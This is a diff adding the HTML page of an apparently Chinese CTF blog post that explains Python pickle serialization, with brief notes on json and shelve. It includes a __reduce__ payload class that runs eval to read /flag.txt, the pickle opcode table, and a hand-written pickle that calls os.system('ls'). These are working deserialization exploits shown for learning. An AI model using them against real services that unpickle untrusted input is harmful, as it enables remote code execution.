@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Python反序列化之谜 |  
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Anti-Genemits" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Python反序列化之谜"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Python反序列化之谜
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/11/08/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E8%B0%9C/" class="article-date">
+  <time datetime="2020-11-08T12:31:06.000Z" itemprop="datePublished">2020-11-08</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">8 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Python反序列化之谜"><a href="#Python反序列化之谜" class="headerlink" title="Python反序列化之谜"></a>Python反序列化之谜</h1><p>反序列化的含义就不具体阐述，参考PHP反序列化的含义，下面直接进python中序列化和反序列化的具体实现过程。</p>
+<h3 id="pickle模块的使用"><a href="#pickle模块的使用" class="headerlink" title="pickle模块的使用"></a>pickle模块的使用</h3><p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p>
+<p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别.</p>
+<p><code>pickle.dump(obj,file, [,protocol])</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：将obj对象序列化存入已经打开的file中。</span><br><span class="line">参数讲解：</span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">file:文件名称。</span><br><span class="line">protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>
+
+<p><code>pickle.load(file)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：将file中的对象序列化读出。</span><br><span class="line">参数讲解：</span><br><span class="line">file：文件名称。</span><br></pre></td></tr></table></figure>
+
+<p><code>pickle.dumps(obj[, protocol])</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：将obj对象序列化为string形式，而不是存入文件中。</span><br><span class="line">参数讲解：</span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>
+
+<p><code>pickle.loads(string)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：从string中读出序列化前的obj对象。</span><br><span class="line">参数讲解：</span><br><span class="line">string：文件名称。</span><br><span class="line">【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/11/08/WydlNxHVZJS3gQL.png"></p>
+<p>python魔术方法详解:<a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id51">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id51</a></p>
+<p>可以看的出来在<code>reduce</code>函数他才具有调用函数的功能，我们在构建payload的时候，也大多数是借由这个函数来进行发挥的，但这也只是在<code>pickle</code>的模块下成立，下面分享一个简易的payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload()，protocol&#x3D;0)</span><br><span class="line">a &#x3D; urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<p>可以从上面的文档中看出，<code>reduce</code>这个特殊方法的功能大致就是这样，你返回的是一个元祖，第一个元素是调用的对象，第二个是传入的参数。</p>
+<p>这里的<code>protocol=0</code>也是一个新的知识点，有一个小技巧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</span><br><span class="line">v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</span><br><span class="line">v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</span><br><span class="line">v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</span><br><span class="line">v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。</span><br></pre></td></tr></table></figure>
+
+<p>使用的协议越高，需要的python版本就得越新。</p>
+<p>下面再感谢从大佬那里复制来的payload，手撸pickle，直接撸二进制。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44377940/article/details/106863514%E3%80%82">https://blog.csdn.net/weixin_44377940/article/details/106863514。</a></p>
+<p>先把指令集和手写的基本模式贴在下面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           &#x3D; b&#39;(&#39;   # push special markobject on stack</span><br><span class="line">STOP           &#x3D; b&#39;.&#39;   # every pickle ends with STOP</span><br><span class="line">POP            &#x3D; b&#39;0&#39;   # discard topmost stack item</span><br><span class="line">POP_MARK       &#x3D; b&#39;1&#39;   # discard stack top through topmost markobject</span><br><span class="line">DUP            &#x3D; b&#39;2&#39;   # duplicate top stack item</span><br><span class="line">FLOAT          &#x3D; b&#39;F&#39;   # push float object; decimal string argument</span><br><span class="line">INT            &#x3D; b&#39;I&#39;   # push integer or bool; decimal string argument</span><br><span class="line">BININT         &#x3D; b&#39;J&#39;   # push four-byte signed int</span><br><span class="line">BININT1        &#x3D; b&#39;K&#39;   # push 1-byte unsigned int</span><br><span class="line">LONG           &#x3D; b&#39;L&#39;   # push long; decimal string argument</span><br><span class="line">BININT2        &#x3D; b&#39;M&#39;   # push 2-byte unsigned int</span><br><span class="line">NONE           &#x3D; b&#39;N&#39;   # push None</span><br><span class="line">PERSID         &#x3D; b&#39;P&#39;   # push persistent object; id is taken from string arg</span><br><span class="line">BINPERSID      &#x3D; b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class="line">REDUCE         &#x3D; b&#39;R&#39;   # apply callable to argtuple, both on stack</span><br><span class="line">STRING         &#x3D; b&#39;S&#39;   # push string; NL-terminated string argument</span><br><span class="line">BINSTRING      &#x3D; b&#39;T&#39;   # push string; counted binary string argument</span><br><span class="line">SHORT_BINSTRING&#x3D; b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><span class="line">UNICODE        &#x3D; b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument</span><br><span class="line">BINUNICODE     &#x3D; b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class="line">APPEND         &#x3D; b&#39;a&#39;   # append stack top to list below it</span><br><span class="line">BUILD          &#x3D; b&#39;b&#39;   # call __setstate__ or __dict__.update()</span><br><span class="line">GLOBAL         &#x3D; b&#39;c&#39;   # push self.find_class(modname, name); 2 string args</span><br><span class="line">DICT           &#x3D; b&#39;d&#39;   # build a dict from stack items</span><br><span class="line">EMPTY_DICT     &#x3D; b&#39;&#125;&#39;   # push empty dict</span><br><span class="line">APPENDS        &#x3D; b&#39;e&#39;   # extend list on stack by topmost stack slice</span><br><span class="line">GET            &#x3D; b&#39;g&#39;   # push item from memo on stack; index is string arg</span><br><span class="line">BINGET         &#x3D; b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class="line">INST           &#x3D; b&#39;i&#39;   # build &amp; push class instance</span><br><span class="line">LONG_BINGET    &#x3D; b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg</span><br><span class="line">LIST           &#x3D; b&#39;l&#39;   # build list from topmost stack items</span><br><span class="line">EMPTY_LIST     &#x3D; b&#39;]&#39;   # push empty list</span><br><span class="line">OBJ            &#x3D; b&#39;o&#39;   # build &amp; push class instance</span><br><span class="line">PUT            &#x3D; b&#39;p&#39;   # store stack top in memo; index is string arg</span><br><span class="line">BINPUT         &#x3D; b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class="line">LONG_BINPUT    &#x3D; b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class="line">SETITEM        &#x3D; b&#39;s&#39;   # add key+value pair to dict</span><br><span class="line">TUPLE          &#x3D; b&#39;t&#39;   # build tuple from topmost stack items</span><br><span class="line">EMPTY_TUPLE    &#x3D; b&#39;)&#39;   # push empty tuple</span><br><span class="line">SETITEMS       &#x3D; b&#39;u&#39;   # modify dict by adding topmost key+value pairs</span><br><span class="line">BINFLOAT       &#x3D; b&#39;G&#39;   # push float; arg is 8-byte float encoding</span><br><span class="line">​</span><br><span class="line">TRUE           &#x3D; b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          &#x3D; b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</span><br></pre></td></tr></table></figure>
+
+<p>基本模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;callable&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure>
+
+<p>举个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S&#39;ls&#39;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<p>这部分按照指令集中的<code>b&#39;c&#39;</code>来看，表示引入模块和函数。由于该指令需要两个字符串（一个为模块名，一个为函数名），所以，接下来的两个字符串用<code>\n</code>当作分隔符和休止符，意义为<code>__import__(os).system</code></p>
+<p><code>tR.</code></p>
+<p>这个最简单，<code>b&#39;t&#39;</code>表示从最顶层堆栈项生成元组，<code>b&#39;R&#39;</code>表示在堆栈上应用可调用的<strong>元组</strong>，<code>b&#39;.&#39;</code>表示结束构造pickle。也就是说这个指令等同于<code>__import__(&#39;os&#39;).system(*(&#39;ls&#39;,))</code></p>
+<p>所以这里告诉我们一个道理，万物到最后都是汇编语言，二进制，web狗活不下去的。</p>
+<h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># json所有的语言都通用，它能序列化的数据是有限的：字典列表和元组</span><br><span class="line">import json</span><br><span class="line"># json.dumps()与json.loads()是一对</span><br><span class="line"># json.dump()与json.load()是一对</span><br><span class="line"># json.dumps()#序列号 “obj” 数据类型 转换为 JSON格式的字符串</span><br><span class="line"># ret &#x3D; json.dumps(&#123;&#39;k&#39;:(1,2,3)&#125;)</span><br><span class="line"># print(repr(ret),type(ret))      #str()是将作用对象“以字符串格式输出”，重在输出；repr()是“显示对象是什么东西”，重在表述。所以在调试程序时常常用后者打印。</span><br><span class="line"># ret2 &#x3D; json.loads(ret)    #将包含str类型的JSON文档反序列化为一个python对象</span><br><span class="line"># print(repr(ret2),type(ret2))</span><br><span class="line"># #json.dump()#理解为两个动作，一个动作是将”obj“转换为JSON格式的字符串，还有一个动作是将字符串</span><br></pre></td></tr></table></figure>
+
+<h3 id="shelve"><a href="#shelve" class="headerlink" title="shelve"></a>shelve</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># shelve也是python提供给我们的序列化工具，比pickle用起来更简单一些</span><br><span class="line"># shelve只提供给我们一个open方法，是用key来访问的，使用起来和字典类似</span><br></pre></td></tr></table></figure>
+
+<p>差不多是这个样子。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/11/08/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E8%B0%9C/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/11/06/cobaltstrike/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">cobaltstrike</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2020
+        <i class="ri-heart-fill heart_icon"></i> 码农
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by Hexo
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/anti-genemits" target="_blank">Anti-Genemits</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Anti-Genemits"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E7%BC%96%E7%A8%8B/">编程</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/CTF/">CTF</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
